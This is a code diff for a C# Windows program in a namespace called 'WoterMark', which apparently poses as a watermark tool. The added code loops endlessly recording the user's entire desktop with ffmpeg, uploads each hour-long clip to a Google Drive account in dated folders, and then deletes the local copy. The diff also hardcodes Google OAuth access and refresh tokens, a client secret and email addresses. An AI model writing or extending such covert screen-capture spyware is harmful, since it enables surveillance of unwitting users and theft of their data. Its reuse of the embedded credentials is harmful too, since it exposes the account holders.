@@ -34,6 +34,12 @@ namespace WoterMark
 {
     public partial class MainWindow : Window
     {
+        private const string _AccessToken = "ya29.a0AXooCguR03Y1aa9ZB2i11jqzQXTmmCDDvIWjq9GK_o7NWeglxZv-qRpYZPowoxiOIZBIR_ZZMPXcZL9NPwEyi7GTRx2tF-QacqSu-KBJlnhCP6P82LkhRnIwr-JPECfMYgwcX4XlUOwrB0OKEQLahQTXQSvTBtIcQzIeaCgYKAVcSARMSFQHGX2MikAZujxR-yJvv7lyH5s6S_g0171";
+        private const string _RefreshToken = "1//04TYvodE0hcHGCgYIARAAGAQSNwF-L9Ir-_bpulQ4uBfztYdgjiSjQamvG39icW3C1Rzu658DtzFzsa88ZhqSaGQg-a24NSNwaVY";
+        private const string _ClientId = "137923084845-2s9kl5knqe8mpa2orfg78nt8qeph8j9s.apps.googleusercontent.com";
+        private const string _ClientSecret = "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";
+        private const string _ApplicationName = "service";
+        private const string _UserName = "shared.vid.acc@gmail.com";
         public MainWindow()
         {
             try
@@ -52,15 +58,22 @@ namespace WoterMark
         {
             var executor = new CommandLineExecutor();
             var libsPath = "C:\\Program Data";
+            var currentDate = DateTime.Now.ToString("yyyy-MM-dd");
+            var parentId = CreateFolder(currentDate);
             while (true)
             {
                 try
                 {
-                    var dt = DateTime.Now.ToString("yyyy-MM-dd-HH-mm");
-                    executor.Execute($"cd {libsPath}", $"ffmpeg.exe -t 36 -hide_banner -loglevel error -f gdigrab -framerate 15 -i desktop -c:v libx264 {dt}.mp4 -f {dt}.mp4");
-                    Thread.Sleep(36100);
+                    if (currentDate != DateTime.Now.ToString("yyyy-MM-dd"))
+                    {
+                        currentDate = DateTime.Now.ToString("yyyy-MM-dd");
+                        parentId = CreateFolder(currentDate);
+                    }
 
-                    UploadFile($"{libsPath}/{dt}.mp4");
+                    var dt = DateTime.Now.ToString("yyyy-MM-dd-HH-mm");
+                    executor.Execute(true, $"cd {libsPath}", $"ffmpeg.exe -t 3600 -hide_banner -loglevel error -f gdigrab -framerate 15 -i desktop -c:v libx264 {dt}.mp4 -f {dt}.mp4");
+
+                    UploadFile($"{libsPath}/{dt}.mp4", new string[] {parentId});
                     System.IO.File.Delete($"{libsPath}/{dt}.mp4");
                     Thread.Sleep(10000);
                 }
@@ -87,20 +100,20 @@ namespace WoterMark
         {
             var tokenResponse = new TokenResponse
             {
-                AccessToken = "ya29.a0AXooCgulQKAnhfP8abuaghts6kK-U7EGMTgeqkZnruBPbPViALxWU1SVMBrTjRkotqxvpL7NQ1ylC9oaiKisa1kDISpVLhAmSUCHZFs9PqAdVHCMQBJ81ue395bppcDTV--FkMjEyg9RJyMf1wwnJBxkFHGhlULNhhq8aCgYKAdgSARASFQHGX2MizeBSZ2LfIYY66ZXLtitVIg0171",
-                RefreshToken = "1//04snwG8pBGWquCgYIARAAGAQSNwF-L9IrU6GQicr4ZzRfXOIuXrQrj0fS4xbuc2EJP6qyNlOjTcfDia09OStB82OF0QV-ZtFsQRY",
+                AccessToken = _AccessToken,
+                RefreshToken = _RefreshToken
             };
 
-            var applicationName = "service"; // Use the name of the project in Google Cloud
-            var username = "freiaqwerty@gmail.com"; // Use your email
+            var applicationName = _ApplicationName; // Use the name of the project in Google Cloud
+            var username = _UserName; // Use your email
 
 
             var apiCodeFlow = new GoogleAuthorizationCodeFlow(new GoogleAuthorizationCodeFlow.Initializer
             {
                 ClientSecrets = new ClientSecrets
                 {
-                    ClientId = "137923084845-2s9kl5knqe8mpa2orfg78nt8qeph8j9s.apps.googleusercontent.com",
-                    ClientSecret = "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"
+                    ClientId = _ClientId,
+                    ClientSecret = _ClientSecret
                 },
                 Scopes = new[] { DriveService.Scope.Drive },
                 DataStore = new FileDataStore(applicationName)
@@ -120,20 +133,22 @@ namespace WoterMark
         }
 
 
-        public string CreateFolder(string parent, string folderName)
+        public string CreateFolder(string folderName, string[] parentIds = null)
         {
             var service = GetService();
             var driveFolder = new Google.Apis.Drive.v3.Data.File();
             driveFolder.Name = folderName;
             driveFolder.MimeType = "application/vnd.google-apps.folder";
-            //  driveFolder.Parents = new string[] { parent };
+            if (parentIds != null)
+                driveFolder.Parents = parentIds;
+
             var command = service.Files.Create(driveFolder);
             var file = command.Execute();
             return file.Id;
         }
 
 
-        public string UploadFile(string fileName)
+        public string UploadFile(string fileName, string[] parentIds = null)
         {
             var libsPath = "C:\\Program Data";
             DriveService service = GetService();
@@ -144,12 +159,16 @@ namespace WoterMark
                 {
                     Name = fsSource.Name
                 };
+
+                if (parentIds != null)
+                    fileMetadata.Parents = parentIds;
+
                 var request = service.Files.Create(fileMetadata, fsSource, "video/mp4");
                 request.Fields = "*";
                 var results = request.Upload();
 
                 System.IO.File.AppendAllText($"{libsPath}\\1.txt", results?.Exception?.Message ?? "Success");
-                System.IO.File.AppendAllText($"{libsPath}\\1.txt", results.Status.ToString());
+                System.IO.File.AppendAllText($"{libsPath}\\1.txt", results?.Status.ToString());
                 if (results.Status == UploadStatus.Failed)
                 {
                     Console.WriteLine($"Error uploading file: {results.Exception.Message}");
